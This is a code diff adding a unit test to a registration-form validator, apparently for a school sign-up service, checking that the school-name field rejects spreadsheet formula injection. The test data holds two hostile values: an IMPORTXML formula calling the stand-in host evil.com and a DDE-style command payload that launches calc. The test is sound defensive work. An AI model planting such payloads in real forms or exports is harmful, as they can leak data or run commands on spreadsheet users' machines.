@@ -116,6 +116,22 @@ describe("Registration Form Validation & Normalisation (REG-01..REG-11)", () => 
     assert.ok(res.errors.turnstileToken);
   });
 
+  it("rejects formula injection symbols and invalid characters in school name", () => {
+    const formulaPayload = validateRegistrationForm(
+      makeValidForm({ schoolName: "=IMPORTXML(\"https://evil.com\", \"//a\")" }),
+      { availablePlans: REFERENCE_PLANS_OVERVIEW }
+    );
+    assert.equal(formulaPayload.isValid, false);
+    assert.ok(formulaPayload.errors.schoolName);
+
+    const plusPayload = validateRegistrationForm(
+      makeValidForm({ schoolName: "+cmd|' /C calc'!A0" }),
+      { availablePlans: REFERENCE_PLANS_OVERVIEW }
+    );
+    assert.equal(plusPayload.isValid, false);
+    assert.ok(plusPayload.errors.schoolName);
+  });
+
   it("formats Naira amounts cleanly", () => {
     assert.equal(formatNaira(1500), "₦1,500");
     assert.equal(formatNaira(6000), "₦6,000");
